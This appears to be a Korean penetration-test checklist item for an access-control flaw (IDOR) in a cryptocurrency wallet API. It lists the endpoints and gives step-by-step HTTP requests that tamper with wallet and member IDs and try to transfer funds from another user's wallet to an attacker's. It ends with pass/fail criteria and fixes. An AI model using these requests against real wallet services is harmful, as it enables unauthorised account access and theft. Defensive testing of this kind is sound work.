================================================================================
[VCE-WALLET-01] 지갑 주소 IDOR → 타 사용자 입금 주소 조회
도메인: wallet (지갑/이체)
================================================================================

## 1. 진단 항목 개요

- **항목명**: 지갑 주소 조회 IDOR
- **번호**: WALLET-01
- **위험도**: High
- **OWASP**: A01:2021 – Broken Access Control

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/wallets/{assetType}/address |
| 운영 | https://vceapp.com/api/wallets/{assetType}/address |
| HTTP 메서드 | GET |
| 인증 요건 | Bearer JWT 필요 |

## 3. 취약점 원리 (Why this works)

지갑 주소 조회 시 현재 사용자 기반 필터링이 없으면,
assetType 파라미터만으로 다른 사용자의 지갑 주소를 조회할 수 있다.

또한 지갑 주소가 예측 가능하거나 순차적이면
직접 주소를 탐색하여 타 사용자 입금 주소를 획득 가능하다.

## 4. 테스트 절차 (Step-by-step)

### Step 1. 자신의 지갑 주소 조회

```
GET /api/wallets/BTC/address HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT_A>
```

응답: `{"address": "bc1qxxx...", "walletId": 1}`

---

### Step 2. walletId 파라미터로 타 사용자 주소 조회

```
GET /api/wallets/BTC/address?walletId=2 HTTP/1.1
GET /api/wallets/BTC/address?memberId=2 HTTP/1.1
```

---

### Step 3. JWT_B 없이 JWT_A로 assetType 변경

```
GET /api/wallets/ETH/address HTTP/1.1
Authorization: Bearer <JWT_A>
```

응답에 다른 사용자 지갑 정보가 혼재되는지 확인.

---

### Step 4. 내부 이체 IDOR

```
POST /api/wallets/transfer HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT_A>
Content-Type: application/json

{
  "fromAddress": "타사용자_지갑주소",
  "toAddress": "공격자_지갑주소",
  "amount": 0.001,
  "assetType": "BTC"
}
```

타 사용자 지갑에서 공격자 지갑으로 이체 시도.

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- walletId/memberId 파라미터로 타 사용자 주소 조회 성공
- 타 사용자 지갑 주소에서 이체 성공

✗ **안전 (Not Vulnerable)**:
- 항상 현재 인증 사용자의 지갑만 반환
- 타 사용자 이체 시도 → HTTP 403

## 6. 예상 취약 포인트 (코드 위치)

- `WalletController.java` — getAddress 메서드 소유자 검증
- `WalletService.java` — transfer 메서드에서 fromAddress 소유자 확인

## 7. 권고 조치

- 지갑 조회 시 항상 `WHERE member.email = :email AND asset_type = :type`
- 이체 시 fromAddress가 현재 사용자 소유인지 반드시 검증
